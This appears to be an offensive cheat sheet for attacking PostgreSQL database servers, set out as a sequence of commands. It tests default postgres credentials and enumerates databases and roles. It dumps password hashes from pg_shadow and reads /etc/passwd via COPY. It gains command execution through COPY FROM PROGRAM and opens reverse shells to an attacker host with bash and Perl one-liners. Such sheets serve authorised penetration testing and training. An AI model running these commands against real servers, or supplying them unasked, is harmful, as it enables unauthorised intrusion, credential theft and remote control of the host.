## CHECKS

```md
# Check if PostgreSQL is exposed (5432)
# Test default credentials
# Enumerate databases and roles
# Check for superuser privileges
# Attempt file read
# Check for COPY FROM PROGRAM (RCE)
```
## CONNECT – CHECK DEFAULT CREDENTIALS

```bash
# Default Credentials
postgres:postgres

# Connect
psql -h $ip -p 5432 -U postgres
```

If password required:

```bash
psql -h $ip -U <user> -d <database>
```
## BASIC ENUMERATION

```sql
-- List Databases
\l
SELECT datname FROM pg_database;

-- Connect to Database
\c <database>

-- List Tables
\d

-- List Schemas
\dn+
SELECT schema_name, schema_owner FROM information_schema.schemata;

-- List Roles
\du
\du+

-- Current User
SELECT user;

-- Current Database
SELECT current_catalog;

-- Installed Extensions
SELECT * FROM pg_extension;

-- Available Languages
SELECT lanname, lanacl FROM pg_language;

-- Command History
\s
```
## CREDENTIAL DUMPING

```sql
-- Read Username + Password Hash (Requires Superuser)
SELECT usename, passwd FROM pg_shadow;
```
## READ FILE (If Permitted)

```sql
CREATE TABLE demo(t text);
COPY demo FROM '/etc/passwd';
SELECT * FROM demo;
```

⚠ Requires superuser or proper file permissions.
## REMOTE CODE EXECUTION (RCE)

Works if:

* Superuser privileges
* `COPY FROM PROGRAM` allowed

### Proof of Concept

```sql
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);

COPY cmd_exec FROM PROGRAM 'id';

SELECT * FROM cmd_exec;

DROP TABLE IF EXISTS cmd_exec;
```
### Reverse Shell Example

⚠ Escape single quotes with double single quotes (`''`)

```sql
COPY cmd_exec FROM PROGRAM 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1';
```

Perl variant:

```sql
COPY cmd_exec FROM PROGRAM 'perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"ATTACKER_IP:PORT");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;''';
```
## PRIVILEGE CHECK

```sql
-- Check if current user is superuser
SELECT rolsuper FROM pg_roles WHERE rolname = current_user;
```

If `rolsuper = true` → full system compromise possible.
## NOTES

```md
- Default port: 5432
- Default user: postgres
- Superuser = full OS access via COPY FROM PROGRAM
- pg_shadow contains password hashes
- Often used in web applications (Django, Rails, etc.)
- RCE possible if misconfigured
```
## REFERENCE

```md
https://book.hacktricks.xyz/network-services-pentesting/pentesting-postgresql#connect-and-basic-enum
```
